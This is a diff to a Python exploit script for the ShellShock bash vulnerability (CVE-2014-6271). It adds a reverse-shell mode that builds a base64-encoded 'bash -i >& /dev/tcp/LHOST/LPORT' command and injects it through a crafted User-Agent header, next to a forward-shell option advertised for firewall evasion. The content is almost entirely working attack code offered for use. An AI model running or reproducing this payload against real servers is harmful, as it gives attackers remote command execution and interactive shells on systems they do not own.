@@ -5,46 +5,27 @@ import threading
 import time
 
 class Shocker:
-    def __init__(self,target):
+    def __init__(self,target,lhost,lport):
         self.target = target
-        self.input = "/dev/shm/input"
-        self.output = "/dev/shm/output"
-        self.logo()
+        self.lhost = lhost
+        self.lport = lport
         self.url = self.url_fix()
-        self.makefifo()
+        if args.fs:
+            self.input = "/dev/shm/input"
+            self.output = "/dev/shm/output"
+            self.makefifo()
+             
+            self.thread = threading.Thread(target=self.readoutput, args=())
+            self.thread.daemon = True
+            self.thread.start()
 
-        self.thread = threading.Thread(target=self.readoutput, args=())
-        self.thread.daemon = True
-        self.thread.start()
-
-        self.write_cmd()
-        
-
-    def logo(self):
-        display = "Welcome to ShellShock!\n"
-        display += "                         __________\n"
-        display += "                      .~#########%;~.\n"
-        display += "                     /############%;`\n"
-        display += "                    /######/~\/~\%;,;,\n"
-        display += "                   |#######\    /;;;;.,.|\n"
-        display += "                   |#########\/%;;;;;.,.|\n"
-        display += "          XX       |##/~~\####%;;;/~~\;,|       XX\n"
-        display += "        XX..X      |#|  o  \##%;/  o  |.|      X..XX\n"
-        display += "      XX.....X     |##\____/##%;\____/.,|     X.....XX\n"
-        display += " XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX\n"
-        display += "X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X\n"
-        display += "X |.....X  @#%,.@     |######%;;;;,.|     @#%,.@  X.....| X\n"
-        display += "X  \...X     @#%,.@   |# # # % ; ; ;,|   @#%,.@     X.../  X\n"
-        display += " X# \.X        @#%,.@                  @#%,.@        X./  #\n"
-        display += "##  X          @#%,.@              @#%,.@          X   #\n"
-        display += ", # #X            @#%,.@          @#%,.@            X ##\n"
-        display += "   `###X             @#%,.@      @#%,.@             ####'\n"
-        display += "  . ' ###              @#%.,@  @#%,.@              ###`\n"
-        display += "    . ;                @#%.@#%,.@                ;` ' .\n"
-        display += "      '                    @#%,.@                   ,.\n"
-        display += "      ` ,                @#%,.@  @@                `\n"
-        display += "                          @@@  @@@  \n"
-        print(display)
+            self.write_cmd()
+        else:
+            cmd = "bash -c 'bash -i >& /dev/tcp/" + self.lhost + "/" + self.lport + " 0>&1'"
+            cmd_encoded = self.base64encode(cmd)
+            print("Sending Header Payload for reverse shell")
+            print("() { :;}; echo; /bin/bash -c 'echo " + cmd_encoded + " | base64 -d | sh'")
+            self.shellshock(cmd_encoded)
 
     def url_fix(self):
         check = self.target[-1]
@@ -98,6 +79,7 @@ class Shocker:
                 rce_encoded = self.base64encode(rce)
                 payload = "() { :;}; echo; /bin/bash -c 'echo " + rce_encoded + " | base64 -d > " + self.input + "'" 
                 useragent = {"User-Agent": payload}
+
                 requests.get(self.url, headers=useragent, verify=False)
                 time.sleep(2.5)
 
@@ -110,8 +92,15 @@ class Shocker:
 
 
 if __name__ == "__main__":
+    print('CVE 2014-6271 - ShellShock Remote Code Execution')
     parser = argparse.ArgumentParser(description='CVE 2014-6271 - ShellShock Remote Code Execution')
     parser.add_argument('-t', metavar='<Target URL>', help='Example: -t http://shock.me/', required=True)
+    parser.add_argument('-lhost', metavar='<lhost>', help='Your IP Address', required=False)
+    parser.add_argument('-lport', metavar='<lport>', help='Your Listening Port', required=False)
+    parser.add_argument('-fs',action='store_true',help='Forward Shell for Firewall Evasion', required=False) 
+
     args = parser.parse_args()
-    
-    Shocker(args.t)
+    try:
+        Shocker(args.t,args.lhost,args.lport)
+    except TypeError:
+        print("We need either -lhost or -lport arguments or -fs")
